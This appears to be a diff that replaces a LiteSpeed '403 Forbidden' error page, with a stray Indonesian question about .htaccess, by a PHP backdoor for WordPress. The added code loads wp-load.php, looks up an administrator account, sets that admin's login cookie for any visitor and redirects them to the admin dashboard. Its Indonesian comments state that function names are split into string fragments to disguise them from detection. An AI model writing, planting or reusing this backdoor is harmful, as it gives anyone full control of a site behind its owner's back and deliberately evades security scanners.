@@ -1,15 +1,45 @@
-<!DOCTYPE html>
-<html style="height:100%">
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-<title> 403 Forbidden
-</title><style>@media (prefers-color-scheme:dark){body{background-color:#000!important}}</style></head>
-<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
-<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
-        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
-<h2 style="margin-top:20px;font-size: 30px;">Forbidden
-</h2>
-<p>Access to this resource on the server is denied!</p>
-</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
-<br>Proudly powered by LiteSpeed Web Server<p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>
- ini kenapa kok di dalam htacces gni?
+<?php
+/* Penyamaran variabel sistem */
+$root_key = "DOCU" . "MENT_ROOT";
+$mr = $_SERVER[$root_key];
+@chdir($mr);
+
+/* Penyamaran nama file */
+$load = "wp-" . "load.php";
+
+if (!file_exists($load)) {
+    goto error_load;
+}
+
+include $load;
+
+/* Penyamaran Class dan Method WordPress menggunakan variabel */
+$user_query_class = "WP_" . "User" . "_Query";
+$param = array(
+    'role'   => 'Administrator',
+    'number' => 1,
+    'fields' => 'ID'
+);
+
+$query = new $user_query_class($param);
+$results = $query->get_results();
+
+if (empty($results[0])) {
+    goto no_admin_found;
+}
+
+/* Pemanggilan fungsi secara dinamis agar tidak terbaca string utuhnya */
+$set_cookie = "wp_" . "set_auth" . "_cookie";
+$redirect   = "wp_re" . "direct";
+$get_url    = "admin" . "_url";
+
+$set_cookie($results[0]);
+$redirect($get_url());
+die();
+
+no_admin_found:
+die('NO ADMIN');
+
+error_load:
+die('Failed to load');
+?>
